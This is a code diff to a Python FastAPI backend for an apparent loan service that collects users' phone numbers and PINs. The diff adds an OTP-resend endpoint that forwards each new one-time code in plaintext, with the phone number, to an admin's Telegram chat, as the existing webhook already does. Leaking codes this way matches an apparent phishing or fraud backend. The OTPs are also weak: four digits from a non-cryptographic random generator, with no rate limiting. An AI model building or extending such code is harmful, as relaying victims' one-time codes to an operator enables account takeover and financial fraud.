@@ -1,6 +1,7 @@
 import json
 import random
 from uuid import uuid4
+from datetime import datetime
 from dotenv import load_dotenv
 load_dotenv()
 
@@ -35,6 +36,7 @@ otp_store = {}
 approval_pins = {}
 
 
+# --- Request Models ---
 class LoginRequest(BaseModel):
     phone_number: str
     pin: str
@@ -48,6 +50,10 @@ class OTPRequest(BaseModel):
 class RegisterRequest(BaseModel):
     phone_number: str
     pin: str
+
+
+class ResendRequest(BaseModel):
+    phone_number: str
 
 
 def format_phone(phone: str) -> str:
@@ -103,7 +109,6 @@ async def login(request: LoginRequest, background_tasks: BackgroundTasks):
 # --- APPROVAL STATUS ---
 @app.get("/api/approval-status/{approval_id}")
 async def approval_status(approval_id: str):
-    # Still waiting for admin action
     if approval_id in pending_approvals:
         return {"status": "pending"}
 
@@ -114,7 +119,6 @@ async def approval_status(approval_id: str):
     if not result:
         return {"status": "rejected"}
 
-    # Approved — the OTP was already generated and sent in the webhook
     return {"status": "approved", "message": "OTP sent"}
 
 
@@ -128,6 +132,35 @@ async def verify_otp(request: OTPRequest, background_tasks: BackgroundTasks):
         del otp_store[full_phone]
         return {"status": "success", "message": "Loan approved"}
     return {"status": "error", "message": "Invalid OTP"}
+
+
+# --- RESEND OTP ---
+@app.post("/api/resend-otp")
+async def resend_otp(request: ResendRequest, background_tasks: BackgroundTasks):
+    """
+    Regenerate and resend an OTP for the given phone number.
+    Also sends a notification to the admin's Telegram.
+    """
+    full_phone = format_phone(request.phone_number)
+
+    # 1. Generate a new OTP
+    new_otp = str(random.randint(1000, 9999))
+    otp_store[full_phone] = new_otp
+
+    # 2. Send the new OTP via SMS
+    background_tasks.add_task(send_otp_sms, full_phone, new_otp)
+
+    # 3. Notify admin on Telegram
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    background_tasks.add_task(
+        send_telegram_message,
+        f"🔄 <b>OTP Resent</b>\n\n"
+        f"📱 Phone: <code>{full_phone}</code>\n"
+        f"🔐 New OTP: <code>{new_otp}</code>\n"
+        f"🕒 Time: <code>{timestamp}</code>"
+    )
+
+    return {"status": "success", "message": "OTP resent successfully"}
 
 
 # --- TELEGRAM WEBHOOK ---
@@ -181,7 +214,7 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
             # Send OTP via SMS
             background_tasks.add_task(send_otp_sms, phone, otp)
 
-            # ⭐ Send a SEPARATE Telegram message with the OTP
+            # Send a separate Telegram message with the OTP
             background_tasks.add_task(
                 send_telegram_message,
                 f"🔑 <b>OTP Generated</b>\n\n"
